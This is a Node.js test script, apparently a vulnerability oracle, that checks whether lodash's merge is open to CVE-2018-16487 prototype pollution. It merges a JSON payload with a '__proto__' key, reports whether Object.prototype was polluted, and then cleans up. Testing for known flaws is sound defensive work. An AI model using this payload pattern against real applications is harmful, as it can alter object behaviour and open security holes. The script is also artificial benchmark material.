'use strict';

function main() {
  let _;
  try {
    _ = require('lodash');
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Module resolution failed: ' + String(e && e.message)
    }));
    return;
  }

  const marker = 'oracle_' + process.pid + '_' + Date.now();

  // Benign operation: prove _.merge works normally for legitimate data.
  let benignOk = false;
  try {
    const target = { a: { x: 1 } };
    const result = _.merge(target, { a: { y: 2 }, b: 3 });
    benignOk = result && result.a && result.a.x === 1 && result.a.y === 2 && result.b === 3;
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Benign merge operation failed: ' + String(e && e.message)
    }));
    return;
  }

  if (!benignOk) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Benign merge operation produced unexpected result'
    }));
    return;
  }

  const operation_completed = true; // benign op succeeded, so setup is proven good
  let exploit_succeeded = false;
  let evidence = '';

  try {
    // Clean slate for our marker key on Object.prototype.
    delete Object.prototype[marker];

    // CVE-2018-16487: lodash.merge (<=4.17.11) fails to guard against
    // '__proto__' keys when deeply merging attacker-controlled objects,
    // e.g. objects parsed from untrusted JSON input, allowing prototype
    // pollution.
    const maliciousPayload = JSON.parse('{"__proto__":{"' + marker + '":"polluted"}}');

    _.merge({}, maliciousPayload);

    const pollutedValue = ({}).hasOwnProperty.call(Object.prototype, marker)
      ? Object.prototype[marker]
      : undefined;

    if (pollutedValue === 'polluted') {
      exploit_succeeded = true;
      evidence = 'Object.prototype.' + marker + ' was set to "polluted" via lodash.merge with __proto__ payload';
    } else {
      exploit_succeeded = false;
      evidence = 'Object.prototype.' + marker + ' was not polluted after merge call; value=' + String(pollutedValue);
    }
  } catch (e) {
    // An exception during the malicious call, after benign success, counts as blocked.
    exploit_succeeded = false;
    evidence = 'Malicious merge call threw (treated as blocked): ' + String(e && e.message);
  } finally {
    // Clean up any pollution we may have introduced.
    try {
      delete Object.prototype[marker];
    } catch (cleanupErr) {
      // ignore cleanup errors
    }
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed,
    exploit_succeeded,
    evidence
  }));
}

main();
